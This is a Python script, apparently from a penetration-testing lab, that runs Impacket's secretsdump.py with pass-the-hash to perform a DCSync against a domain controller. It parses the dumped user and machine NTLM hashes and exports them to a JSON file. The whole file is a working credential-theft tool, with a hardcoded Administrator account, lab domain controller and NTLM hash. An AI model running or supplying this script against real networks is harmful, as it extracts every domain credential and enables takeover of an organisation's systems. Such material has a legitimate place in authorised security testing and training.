import subprocess
import re
import json
from datetime import datetime

def run_secretsdump(domain, user, target, ntlm_hash, output_file):
    command = [
        "secretsdump.py",
        "-just-dc",
        "-hashes",
        f":{ntlm_hash}",
        f"{domain}/{user}@{target}"
    ]

    try:
        result = subprocess.run(command, stdout=subprocess.PIPE, stderr=subprocess.PIPE, text=True, check=True)
        output = result.stdout.splitlines()
    except subprocess.CalledProcessError as e:
        print(f"[!] Erreur : {e.stderr}")
        return

    creds = parse_dump_lines(output)

    with open(output_file, "w") as f:
        json.dump(creds, f, indent=2)

    print(f"[+] Export terminé : {output_file}")

def parse_dump_lines(lines):
    user_regex = re.compile(
        r'^(?P<user>[^\\:$]+(?:\\[^:$]+)?):(?P<rid>\d+):(?P<lm>[a-fA-F0-9]+):(?P<ntlm>[a-fA-F0-9]+):::$'
    )
    host_regex = re.compile(
        r'^(?P<hostname>[A-Z0-9\-]+)\$:.*:(?P<ntlm>[a-fA-F0-9]{32})'
    )

    parsed = []

    for line in lines:
        line = line.strip()
        match_user = user_regex.match(line)
        match_host = host_regex.match(line)

        if match_user:
            raw_user = match_user.group('user')
            if '\\' in raw_user:
                domain, username = raw_user.split('\\', 1)
            else:
                domain = ''
                username = raw_user
            parsed.append({
                "type": "user",
                "username": username,
                "domain": domain,
                "rid": match_user.group("rid"),
                "ntlm": match_user.group("ntlm")
            })

        elif match_host:
            parsed.append({
                "type": "computer",
                "hostname": match_host.group("hostname"),
                "ntlm": match_host.group("ntlm")
            })

    return parsed

if __name__ == "__main__":
    domain = "LAB"
    user = "Administrator"
    target = "LAB-DC01"
    ntlm_hash = "5b0919ae45a59248aea030b9f193098a"
    output_file = f"secret_creds_{datetime.now().strftime('%Y%m%d_%H%M%S')}.json"

    run_secretsdump(domain, user, target, ntlm_hash, output_file)

